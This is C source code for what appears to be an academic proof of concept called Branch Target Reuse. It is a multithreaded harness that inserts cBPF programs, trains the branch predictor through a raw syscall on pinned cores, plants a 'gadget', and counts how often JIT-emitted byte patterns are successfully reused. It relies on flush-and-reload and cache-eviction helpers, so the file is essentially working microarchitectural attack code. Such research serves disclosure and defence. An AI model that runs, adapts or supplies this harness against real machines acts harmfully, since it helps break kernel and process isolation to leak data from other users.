/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>
#include <syscall.h>
#include <stdatomic.h>
#include <sys/time.h>


#include "flush_and_reload.h"
#include "common.h"
#include "cbpf.h"
#include "find_l2_set.h"
#include "l3_eviction.h"


enum controller_status_t {
    CONT_READY,
    CONT_TRAINING,
    CONT_GADGET_INSERTED,
    CONT_CLEAN_UP
};

struct arg_struct {
    atomic_int active;
    struct config * cfg;
    _Atomic pthread_t tid_a;
    _Atomic pthread_t tid_b;
    _Atomic uint64_t round;
};

atomic_int controller_status = CONT_CLEAN_UP;
atomic_int exit_training_program = 0;
atomic_int training_status = 0;
atomic_int insert_first_half_status = 0;

atomic_int do_insert_gadget = 0;
atomic_int exit_gadget_program = 0;

#define DEFAULT_SHADOW_SYMBOL '*'

void * thread_insert_first_half(void * arg) {
    pin_to_core(IDLE_CORE);

    struct arg_struct * args = (struct arg_struct *) arg;
    uint64_t round = (uint64_t) args->round;
    struct config * cfg = args->cfg;

    insert_allow_all_prog();

    insert_first_half_status = 1;

    while (exit_training_program == 0)
    {
        sched_yield();
    }
    exit_training_program = 0;
    fflush(stdout);
    pthread_exit(0);
}

void * thread_do_training(void * arg) {
    pin_to_core(IDLE_CORE);


    struct arg_struct * args = (struct arg_struct *) arg;
    uint64_t round = (uint64_t) args->round;
    struct config * cfg = args->cfg;


    pin_to_core(LEAK_CORE);

    while (insert_first_half_status == 0) { sched_yield(); }
    insert_first_half_status = 0;

    insert_allow_all_prog();

    if (cfg->capture_reuse_rate) {
        uint64_t entry_point  = read_uint64_from_fd(cfg->fd_get_entry_point);
    }


    for (size_t i = 0; i < 2; i++)
    {
        asm volatile(
            "mov $0x220, %%rax\n"
            "syscall\n"
            :
            : "D" (0), "S" (0) // rdi, rsi
            : "r11", "rcx", "rax"
        );
    }

    training_status = 1;
    exit_training_program = 1;


    fflush(stdout);
    pthread_exit(0);
}


uint64_t total_time_insert_gadget;
uint64_t total_time_insert_gadget_iter;

uint64_t total_time_thread_creation;


void * thread_insert_gadget(void * arg) {
    struct timeval t0, t1;
    void *status;

    pin_to_core(IDLE_CORE);

    struct arg_struct * args = (struct arg_struct *) arg;
    uint64_t round = (uint64_t) args->round;
    struct config * cfg = args->cfg;


    pthread_join(args->tid_a, &status);
    pthread_join(args->tid_b, &status);

    fflush(stdout);

    insert_double_page_size_prog();

    controller_status = CONT_GADGET_INSERTED;


    while (exit_gadget_program == 0)
    {
        sched_yield();
    }

}

#define THREADS
#define THREADS_A

uint64_t succes_reuse = 0;
uint64_t total_reuse = 0;

void * thread_controller(void * arg) {
    pthread_t tid_a[2], tid_b[2], tid_c[2];
    int cur = 0, next = 1;
    void *status;
    struct config * cfg = (struct config *) arg;
    struct arg_struct thread_args[2] = {{ .active = 0, .cfg = cfg},
                                  { .active = 0, .cfg = cfg}};
    struct timeval t0, t1;
    uint64_t round = 0, finished = 0;

    pin_to_core(CONTROLLER_CORE);
    controller_status = CONT_READY;

    total_time_insert_gadget_iter = 0;
    total_time_insert_gadget = 0;


    while (1)
    {
        if (round != finished) {
            printf("MAIN r=%lu Error! mismatch. Finished %lu\n", round, finished);
            exit(0);
        }
        round += 1;
        // create new threads for the next round
        thread_args[cur].active = 1;

        thread_args[cur].round = round;
        fflush(stdout);
        pthread_create(&tid_a[cur], NULL, thread_insert_first_half, &thread_args[cur]);
        pthread_create(&tid_b[cur], NULL, thread_do_training,  &thread_args[cur]);
        thread_args[cur].tid_a = tid_a[cur];
        thread_args[cur].tid_b = tid_b[cur];
        pthread_create(&tid_c[cur], NULL, thread_insert_gadget,  &thread_args[cur]);

        fflush(stdout);

        fflush(stdout);

        while (controller_status != CONT_CLEAN_UP) {
            sched_yield();
        }

        if (cfg->capture_reuse_rate) {
            total_reuse  += 1;
            uint64_t byte_code  = read_uint64_from_fd(cfg->fd_read_entry_point);

            if (cfg->constant_blind_safe) {
                if (byte_code == 0x001490e900001490 || byte_code == 0x00001490e9000014 || byte_code == 0x90e900001490e900) {
                    succes_reuse += 1;
                }
            } else {
                if (byte_code == 0x67ff90051067ff90 || byte_code == 0x1067ff90051067ff) {
                    succes_reuse += 1;
                }

            }
            if (total_reuse == (cfg->constant_blind_safe ? 100 : 1000)) {
                printf("Reuse: %4lu / %4lu\n", succes_reuse, total_reuse);
                total_reuse = 0;
                succes_reuse = 0;
            }
        }
        fflush(stdout);

        assert(controller_status == CONT_CLEAN_UP);

        exit_gadget_program = 1;
#ifdef THREADS
        pthread_join(tid_c[cur], &status);
#else
        total_time_insert_gadget_iter = 1;
#endif

        exit_training_program = 0;
        exit_gadget_program = 0;


        if (total_time_insert_gadget_iter % 100 == 0) {
            fflush(stdout);
            total_time_insert_gadget_iter = 0;
            total_time_insert_gadget = 0;
            total_time_thread_creation = 0;
        }

        finished++;
        fflush(stdout);

        controller_status = CONT_READY;
    }


}
